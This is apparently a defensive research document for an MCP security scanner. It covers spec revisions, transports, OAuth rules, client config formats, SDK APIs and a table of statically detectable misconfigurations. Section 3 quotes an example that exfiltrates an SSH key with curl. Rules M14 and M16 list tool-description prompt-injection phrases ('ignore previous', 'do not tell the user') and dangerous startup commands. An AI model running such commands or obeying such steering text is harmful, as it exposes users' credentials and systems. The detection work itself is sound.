# Model Context Protocol (MCP) — Static-Analysis Research

> Framework Intelligence / MCP Security research, Phase 0. Researched 2026-10-08.
> Status: research only, no scanner code. Names marked `UNVERIFIED` were not confirmed against an
> official source during this pass and MUST NOT be hard-coded into a recogniser until confirmed.

## 1. Spec revisions in scope

| Revision | Status (2026-10-08) | Why nexvul cares |
|---|---|---|
| **2026-07-28** | Current ("latest"); schema at `schema/2026-07-28/schema.ts` | New SDK majors (Python `mcp` 2.x, TS `@modelcontextprotocol/server` v2) target it |
| 2025-11-25 | Previous; still widely deployed | Most existing repos and SDK v1 code follow it |
| 2025-06-18, 2025-03-26 | Older | Streamable HTTP introduced in 2025-03-26 |
| 2024-11-05 | Legacy | Defined the HTTP+SSE transport (now Deprecated) |

Sources: https://modelcontextprotocol.io/specification/latest ·
changelog https://modelcontextprotocol.io/specification/2026-07-28/changelog

### Key changes in 2026-07-28 (affect what we detect)

- **Stateless protocol.** The `initialize` / `notifications/initialized` handshake is removed; every
  request carries `_meta["io.modelcontextprotocol/protocolVersion"]` and `.../clientCapabilities`.
  New `server/discover` RPC.
- **Protocol-level sessions removed.** No `Mcp-Session-Id`; no HTTP GET stream; no `Last-Event-ID`
  resumability. Cross-call state uses server-minted handles passed as tool arguments → new risk
  "state handle hijacking" (spec security BP: possession of a handle MUST NOT be treated as authn).
- `subscriptions/listen` replaces GET stream and `resources/subscribe`.
- Multi Round-Trip Requests (MRTR): server-initiated sampling/elicitation/roots become
  `InputRequiredResult` (`resultType: "input_required"`).
- Required HTTP headers on Streamable HTTP POST: `MCP-Protocol-Version`, `Mcp-Method`, `Mcp-Name`
  (for `tools/call`, `resources/read`, `prompts/get`); tool params can be mirrored to
  `Mcp-Param-{Name}` via `x-mcp-header` in `inputSchema`.
- **Deprecated:** Roots, Sampling, Logging features; HTTP+SSE transport (formally Deprecated under
  the new lifecycle policy); Dynamic Client Registration (RFC 7591) in favour of Client ID Metadata
  Documents (CIMD).
- Tasks moved to an extension (`io.modelcontextprotocol/tasks`).

**Implication for nexvul:** recognisers must accept both eras. A config/server using
`Mcp-Session-Id`, `sse`, or `initialize` is not itself a vulnerability — it is a legacy-era marker.
"Deprecated transport" is at most an informational finding.

## 2. Transports

Sources: 2025-11-25 https://modelcontextprotocol.io/specification/2025-11-25/basic/transports ·
2026-07-28 https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http

| Transport | Shape | Security notes |
|---|---|---|
| **stdio** | Client launches server as a subprocess; newline-delimited JSON-RPC on stdin/stdout; stderr for logs | Authorization spec: stdio implementations **SHOULD NOT** use OAuth and should "retrieve credentials from the environment". Risk is the *launch command* (arbitrary code execution with user privileges). |
| **Streamable HTTP** | Single MCP endpoint (e.g. `/mcp`), POST per message; response is JSON or a request-scoped SSE stream | Spec "Security & Endpoint" (identical text in 2025-11-25 and 2026-07-28): servers **MUST** validate `Origin` (403 if invalid); when running locally **SHOULD** bind only to `127.0.0.1` not `0.0.0.0`; **SHOULD** implement proper authentication for all connections. "Without these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites." |
| **HTTP+SSE** (2024-11-05) | Separate GET `/sse` + POST `/messages` endpoints | Deprecated since 2025-03-26; Deprecated-state in 2026-07-28. New implementations SHOULD NOT adopt. |

## 3. Authorization (HTTP transports)

Source: https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization (2026-07-28
keeps the model, adds RFC 9207 `iss` validation and deprecates DCR).

- Authorization is **OPTIONAL** for MCP implementations. When supported over HTTP it **SHOULD**
  conform to the spec. → "no auth" is spec-legal; nexvul must frame it as risk, not non-compliance.
- MCP server = OAuth 2.1 resource server; client = OAuth 2.1 client.
- Server **MUST** implement Protected Resource Metadata (RFC 9728): `WWW-Authenticate: Bearer
  resource_metadata="..."` on 401 and/or `/.well-known/oauth-protected-resource[/path]`.
- Client **MUST** use PKCE (S256), **MUST** send `resource` (RFC 8707) in auth and token requests.
- Server **MUST** validate token audience; **MUST NOT** accept or pass through tokens not issued for
  it ("token passthrough" is explicitly forbidden).
- Tokens **MUST** be in `Authorization: Bearer`, **MUST NOT** be in the URI query string.
- Registration: pre-registration, CIMD (SHOULD), DCR (MAY; Deprecated in 2026-07-28).
- AS endpoints MUST be HTTPS; redirect URIs MUST be `localhost` or HTTPS.

Security best practices (https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices):
confused deputy (proxy servers with static client IDs must do per-client consent), token
passthrough, SSRF during OAuth discovery (block private ranges / 169.254.169.254), state-handle
hijacking (2026-07-28) / session hijacking (2025-11-25), **local MCP server compromise** (malicious
startup commands; example given is `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa ...`;
recommends sandboxing and stdio or token-protected HTTP for local servers), OAuth URL scheme
validation (`javascript:` etc.), scope minimization (avoid `*`, `all`, `full-access`).

## 4. Server features: tools, resources, prompts

Source: https://modelcontextprotocol.io/specification/2025-11-25/server/tools ; schema
https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/schema/2026-07-28/schema.ts

- **Tools** (model-controlled). `tools/list`, `tools/call`, `notifications/tools/list_changed`
  (capability `tools.listChanged`). Spec: "there SHOULD always be a human in the loop with the ability
  to deny tool invocations." Servers MUST validate inputs, implement access controls, rate-limit,
  sanitize outputs; clients SHOULD confirm sensitive ops, implement timeouts, validate results.
- **Resources** (application-controlled): `resources/list`, `resources/read`,
  `resources/templates/list`; shape `{uri, name, title?, description?, mimeType?, size?}`.
- **Prompts** (user-controlled): `prompts/list`, `prompts/get`; shape `{name, title?, description?,
  arguments?: [{name, description?, required?}]}`.

### Tool JSON shape

```json
{
  "name": "get_weather",
  "title": "Weather Information Provider",
  "description": "Get current weather information for a location",
  "inputSchema": { "type": "object", "properties": { "location": { "type": "string" } }, "required": ["location"] },
  "outputSchema": { "type": "object" },
  "annotations": { "readOnlyHint": true, "openWorldHint": true },
  "icons": [{ "src": "https://example.com/icon.png", "mimeType": "image/png" }],
  "_meta": {}
}
```

`inputSchema` root MUST be `type: "object"`. Name SHOULD be 1–128 chars `[A-Za-z0-9_.-]`.

### ToolAnnotations (all are hints; defaults from schema.ts doc comments)

| Field | Default when unset | Meaning |
|---|---|---|
| `title` | — | display title |
| `readOnlyHint` | `false` | tool does not modify its environment |
| `destructiveHint` | `true` | may perform destructive updates (meaningful only if `readOnlyHint == false`) |
| `idempotentHint` | `false` | repeat calls have no extra effect (only if not read-only) |
| `openWorldHint` | `true` | interacts with an open world of external entities |

Schema: "all properties in ToolAnnotations are **hints**" and "Clients should never make tool use
decisions based on ToolAnnotations received from untrusted servers." Tools spec: "clients MUST
consider tool annotations to be untrusted unless they come from trusted servers."

**Implication:** An absent annotation means *assume destructive + open-world*. A server declaring
`readOnlyHint: true` on a tool whose body writes files / runs shell is a statically detectable
mismatch (high-signal). Annotations never substitute for approval.

## 5. Client configuration files (exact shapes)

All are untrusted input to nexvul: parse as data (JSON/JSONC), size-limit, never execute.

### 5.1 Claude Desktop — `claude_desktop_config.json`
Location: macOS `~/Library/Application Support/Claude/claude_desktop_config.json`; Windows
`%APPDATA%\Claude\claude_desktop_config.json`. Source:
https://modelcontextprotocol.io/docs/develop/connect-local-servers
```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/username/Desktop"],
      "env": { "BRAVE_API_KEY": "..." }
    }
  }
}
```
Note: the official quickstart itself uses unpinned `npx -y` — the pattern is ubiquitous, so findings
on it must be low severity / informational unless combined with other signals.

### 5.2 Claude Code — project `.mcp.json` (also `~/.claude.json` user/local scope)
Source: https://code.claude.com/docs/en/mcp
```json
{
  "mcpServers": {
    "api-server": {
      "type": "http",
      "url": "${API_BASE_URL:-https://api.example.com}/mcp",
      "headers": { "Authorization": "Bearer ${API_KEY}" }
    },
    "db": { "command": "./servers/db-server", "args": ["--config", "cfg.json"], "env": { "DB_URL": "${DB_URL}" } }
  }
}
```
- `type`: `stdio` (default when `command` present), `http` (alias `streamable-http`), `sse` (deprecated).
- Expansion: `${VAR}` and `${VAR:-default}` in `command`, `args`, `env`, `url`, `headers`.
- Local scope stored in `~/.claude.json` under `projects["/abs/path"].mcpServers`.
- Project servers require interactive approval in Claude Code (mitigating, but `.mcp.json` is
  committed to VCS → supply-chain vector for anyone cloning).

### 5.3 Cursor — `.cursor/mcp.json` (project) / `~/.cursor/mcp.json` (global)
Source: https://cursor.com/docs/context/mcp
```json
{
  "mcpServers": {
    "local-tools": {
      "type": "stdio", "command": "python", "args": ["${workspaceFolder}/tools/mcp_server.py"],
      "env": { "API_KEY": "${env:API_KEY}" }, "envFile": "${workspaceFolder}/.env"
    },
    "remote-api": { "url": "https://api.example.com/mcp", "headers": { "Authorization": "Bearer ${env:MY_SERVICE_TOKEN}" } },
    "oauth-server": { "url": "https://api.example.com/mcp",
      "auth": { "CLIENT_ID": "${env:MCP_CLIENT_ID}", "CLIENT_SECRET": "${env:MCP_CLIENT_SECRET}", "scopes": ["read"] } }
  }
}
```
Interpolation: `${env:NAME}`, `${userHome}`, `${workspaceFolder}`, `${workspaceFolderBasename}`, `${/}`.

### 5.4 VS Code — `.vscode/mcp.json` (top-level key is **`servers`**, not `mcpServers`)
Sources: https://code.visualstudio.com/docs/copilot/reference/mcp-configuration ·
https://code.visualstudio.com/docs/copilot/customization/mcp-servers
```json
{
  "inputs": [ { "type": "promptString", "id": "api-key", "description": "API key", "password": true } ],
  "servers": {
    "local": { "type": "stdio", "command": "npx", "args": ["-y", "@example/mcp-server"],
               "env": { "API_KEY": "${input:api-key}" }, "envFile": "${workspaceFolder}/.env",
               "sandboxEnabled": true },
    "remote": { "type": "http", "url": "https://mcp.example.com/mcp", "headers": { "X-Key": "${input:api-key}" } }
  },
  "sandbox": { "filesystem": { "allowWrite": ["${workspaceFolder}"] }, "network": { "allowedDomains": ["api.example.com"] } }
}
```
- `type`: `stdio` | `http` | `sse`. Optional `cwd`, `dev`.
- VS Code also reads workspace `.mcp.json` (`mcpServers`) and `~/.copilot/mcp-config.json` (`mcpServers`).
- `sandboxEnabled` / `sandbox` keys are macOS/Linux-only; docs say sandboxed tool calls are
  auto-approved (a sandbox is a *mitigating* control nexvul can credit).
- `inputs` with `password: true` is the recommended secret pattern (negative / safe example).

### 5.5 Recogniser guidance for configs
- Match on filename *and* structure (`mcpServers` or `servers` object whose values have
  `command`|`url`). Do not trust filename alone (fake framework metadata).
- Other ecosystems (Windsurf, Zed, Continue, Cline, Gemini CLI, Codex `config.toml`) use similar
  shapes but were **not verified** in this pass → `UNVERIFIED`; add per-client recognisers only
  after confirmation.

## 6. SDK APIs

### 6.1 Python SDK (`mcp` on PyPI)

`pip install mcp` installs **2.x** (targets 2026-07-28). v1 is on branch `v1.x` (last pin v1.28.1).
Sources: https://py.sdk.modelcontextprotocol.io/migration/ ·
https://github.com/modelcontextprotocol/python-sdk (main and v1.x `src/mcp/server/...`).

| Concern | v1.x | v2.x |
|---|---|---|
| Server class | `from mcp.server.fastmcp import FastMCP` | `from mcp.server import MCPServer` (module `mcp.server.mcpserver`; old path raises `ModuleNotFoundError`) |
| Tool decorator | `@mcp.tool(name, title, description, annotations: ToolAnnotations, structured_output)` | same + `icons`, `meta` |
| Resource / prompt | `@mcp.resource("greeting://{name}")`, `@mcp.prompt()` | unchanged |
| Run | `mcp.run(transport="stdio"|"sse"|"streamable-http")`, default `"stdio"` | same literals; `host`/`port` moved from ctor to `run()` |
| Host/port defaults | ctor `host="127.0.0.1"`, `port=8000` | `run_*_async(host="127.0.0.1", port=8000)` |
| ASGI apps | `mcp.streamable_http_app()`, `mcp.sse_app()` | `streamable_http_app(*, streamable_http_path="/mcp", ..., transport_security=None, host="127.0.0.1")` |
| DNS-rebinding protection | Auto-enabled **only** when `transport_security is None and host in ("127.0.0.1","localhost","::1")` | same logic (confirmed in `sse_app`; streamable path forwards `host`/`transport_security`) |
| Auth | ctor `auth=AuthSettings(...)`, `token_verifier=`, `auth_server_provider=` | unchanged names |
| Client | `ClientSession`, `stdio_client`, `StdioServerParameters`, `streamablehttp_client` (alias), `streamable_http_client`, `sse_client` | `from mcp import Client`; `ClientSession` kept; `streamablehttp_client` **removed**; `sse_client` kept |
| Env config | `MCP_*`/`FASTMCP_*` env vars read by Settings `UNVERIFIED` exact prefix | v2: `MCP_*` env vars and `.env` no longer read |

Static signal: `FastMCP(..., host="0.0.0.0")` or `run(transport="streamable-http", host="0.0.0.0")`
disables the automatic DNS-rebinding protection *and* exposes the server to the network.

### 6.2 Standalone FastMCP (`fastmcp` on PyPI, jlowin / Prefect)
Separate project, very common in the wild. `from fastmcp import FastMCP`; `@mcp.tool`,
`mcp.run(transport="http", host=..., port=...)`; ctor `auth=` takes an `AuthProvider`;
`mask_error_details`. Docs appear to describe 4.x (https://gofastmcp.com/servers/server).
Default host for `transport="http"`: `UNVERIFIED`. Names `BearerAuthProvider`, `JWTVerifier`,
`include_tags`/`exclude_tags` ctor args: `UNVERIFIED`. Recogniser must distinguish `fastmcp.FastMCP`
from `mcp.server.fastmcp.FastMCP` by import resolution.

### 6.3 TypeScript SDK
Sources: https://github.com/modelcontextprotocol/typescript-sdk (main = v2) ·
v1 docs https://github.com/modelcontextprotocol/typescript-sdk/blob/v1.x/docs/server.md ·
v1 source `src/server/webStandardStreamableHttp.ts` · v2 API https://ts.sdk.modelcontextprotocol.io/v2/api/

**v1 (`@modelcontextprotocol/sdk`, maintenance line):**
- `McpServer` from `@modelcontextprotocol/sdk/server/mcp.js`; `server.registerTool(name, {title,
  description, inputSchema, outputSchema}, handler)`; older `server.tool(...)` (legacy, exists).
  `annotations` key on `registerTool` config: `UNVERIFIED` in docs (believed present).
- `StdioServerTransport` from `.../server/stdio.js`.
- `StreamableHTTPServerTransport` from `.../server/streamableHttp.js`; options (via
  `WebStandardStreamableHTTPServerTransportOptions`): `sessionIdGenerator` (absent ⇒ stateless),
  `enableJsonResponse=false`, `eventStore`, `maxRequestBodySize=4 MiB`, and **@deprecated**
  `allowedHosts`, `allowedOrigins`, `enableDnsRebindingProtection` (**default `false`**).
- `createMcpExpressApp` from `.../server/express.js`: default host `127.0.0.1` with protection
  auto-enabled; docs: "No auto protection when binding to all interfaces" (`host: '0.0.0.0'`).
- `hostHeaderValidation([...])` middleware; `requireBearerAuth({verifier, expectedResource})` from
  `.../server/auth/middleware/bearerAuth.js`. `mcpAuthRouter`: `UNVERIFIED`.
- `SSEServerTransport`: backwards compat only (class name `UNVERIFIED` in current docs).
- Client: `Client` (`listTools`, `callTool`, ...); `StdioClientTransport`,
  `StreamableHTTPClientTransport`, `SSEClientTransport` import paths `UNVERIFIED`.

**v2 (split packages, implements 2026-07-28):** `@modelcontextprotocol/server` (exports `McpServer`,
`createMcpHandler`, `serveStdio`, middleware `bearerAuth`, `hostHeaderValidation`,
`originValidation`, `oauthMetadata`), `@modelcontextprotocol/server/stdio` (`StdioServerTransport`),
`@modelcontextprotocol/client`, runtime adapters `@modelcontextprotocol/node|express|fastify|hono`.
Exact v2 client class names: `UNVERIFIED`.

Static signal (TS): HTTP transport mounted on `app.listen(port)` with no host (Node binds all
interfaces by default) and no `hostHeaderValidation`/`originValidation`/`bearerAuth` middleware.

## 7. Statically detectable misconfigurations

Severity/confidence are proposals for the Rule Engineer; each needs FP review (§17 of brief).
OWASP mapping: ASI07 (unauthenticated channels), ASI10 (excess capability), ASI09 (no approval),
supply-chain items are adjacent to ASI04 (not primary scope).

| # | Pattern | Static evidence | FP note |
|---|---|---|---|
| M1 | **HTTP MCP server without authentication** | Python: `FastMCP/MCPServer(...)` with no `auth=`/`token_verifier=` and `run(transport in {"streamable-http","sse","http"})` or `streamable_http_app()` mounted with no auth middleware. TS: `StreamableHTTPServerTransport`/`createMcpHandler` route without `requireBearerAuth`/`bearerAuth` or equivalent. | Auth is OPTIONAL in spec; auth may live in a reverse proxy, API gateway, or framework middleware nexvul can't see. Report "no identified auth", medium confidence; raise if also M2. |
| M2 | **Bind to all interfaces** | `host="0.0.0.0"` / `"::"` in `run()`, ctor, `uvicorn.run(app, host="0.0.0.0")`, `createMcpExpressApp({host:'0.0.0.0'})`, `app.listen(port)` with no host (TS). | Containers legitimately bind 0.0.0.0 (Dockerfile/K8s context). Lower severity when Dockerfile present; high when combined with M1. |
| M3 | **DNS-rebinding protection disabled** | `TransportSecuritySettings(enable_dns_rebinding_protection=False)`; TS `enableDnsRebindingProtection: false` or HTTP transport without `allowedHosts`/`hostHeaderValidation`; Python non-localhost host (auto-protection skipped). | Irrelevant for stdio and for servers behind authenticated gateways. |
| M4 | **Shell-exec tool** | Tool function body (decorated `@mcp.tool` / `registerTool` handler) reaches `subprocess.*(shell=True)`, `os.system`, `os.popen`, `child_process.exec/execSync/spawn({shell:true})` with a tool argument. | Legit for dev-tool servers; finding is about *argument-controlled* commands. Constant command with no arg flow → informational. |
| M5 | **Unrestricted filesystem tool** | Tool param flows to `open()/Path.write_text/shutil.rmtree/fs.writeFile/fs.rm` with no path normalisation + allow-root check. Config: `server-filesystem` args include `/`, `~`, `$HOME`. | Path checks via helper functions may be missed (needs inter-procedural). |
| M6 | **Unpinned `npx -y` / `uvx` / `pipx run` / `docker run :latest`** | Config `command` in {`npx`,`bunx`,`pnpm dlx`,`uvx`,`pipx`} and package arg without `@<exact-version>` / `==ver`; `-y` auto-confirms install. | Official MCP quickstart uses this pattern → extremely common. Low severity, informational; elevate only for non-scoped/unknown packages. Never claim the package is malicious. |
| M7 | **Inline secrets in config `env`/`headers`** | Literal values matching secret shapes (`sk-`, `ghp_`, `xox`, AWS `AKIA`, `Bearer <literal>`) rather than `${VAR}`, `${env:VAR}`, `${input:id}`. | Placeholders like `"..."`, `"<your-key>"`, `"YOUR_API_KEY"` are not secrets. Use entropy + known prefixes. Redact values in findings. |
| M8 | **Plain `http://` remote MCP URL (non-loopback)** | `url` scheme `http` and host not `localhost/127.0.0.1/::1`. | Internal service-mesh URLs (`http://svc.cluster.local`) may be TLS-terminated by sidecar → medium/low. |
| M9 | **Deprecated SSE transport** | `"type":"sse"`, `transport="sse"`, `sse_app()`, `SSEServerTransport`. | Informational only; not a vulnerability. |
| M10 | **Token in URL query** | `url` contains `?token=`, `?api_key=`, `access_token=`. | Spec MUST NOT; high confidence. |
| M11 | **Token passthrough** | Server handler forwards incoming `Authorization` header / `ctx` token to a downstream HTTP call. | Requires dataflow; medium confidence. |
| M12 | **Annotation mismatch** | `readOnlyHint=True` / `destructiveHint=False` on a tool whose body writes/deletes/execs. | High signal, but body analysis may be wrong for wrapper calls. |
| M13 | **Destructive tool, no approval path** | Tool name/body indicates delete/pay/send/exec, no `destructiveHint` and no elicitation/confirmation step (ASI09). | Approval may be enforced by the client (Claude/Cursor prompt per call); nexvul cannot see host policy → frame as "server provides no confirmation step". |
| M14 | **Tool description steering** | Description/docstring contains imperative instructions to the model ("ignore previous", "always call X first", "do not tell the user", hidden Unicode, `<IMPORTANT>` blocks). | Natural-language heuristics; keep confidence low/medium; treat docstrings as untrusted data, never interpret. |
| M15 | **Dynamic tool registration from untrusted data** | `registerTool`/`add_tool` in a loop over data fetched at runtime (HTTP/DB); `tools.listChanged` with remote-sourced definitions. | Plugin systems legitimately do this; flag only when source is network. |
| M16 | **Dangerous startup command in config** | `command`/`args` containing `sh -c`, `bash -c`, `curl ... | sh`, `&&`, `sudo`, `rm -rf`, references to `~/.ssh`, `.aws/credentials`. | Spec's own example of local compromise; `sh -c` wrappers occur in benign setups — combine signals. |
| M17 | **Broad OAuth scopes** | `required_scopes=["*"]`, `scopes: ["all"|"admin"|"full-access"]`. | Spec "common mistakes" list; low/medium. |
| M18 | **SSRF-capable fetch tool** | Tool param flows to `requests.get/httpx/fetch` with no allowlist. | Fetch servers exist by design; pair with credential access for ASI10 combination scoring. |

## 8. What static analysis cannot determine (state in docs)
- Whether a gateway/proxy enforces auth or TLS in front of the server.
- What the host client's approval policy is at runtime.
- Whether an `npx` package is malicious, or whether a remote server rug-pulls tool definitions later.
- Runtime `tools/list` contents of remote servers (nexvul never connects to them — local-first).
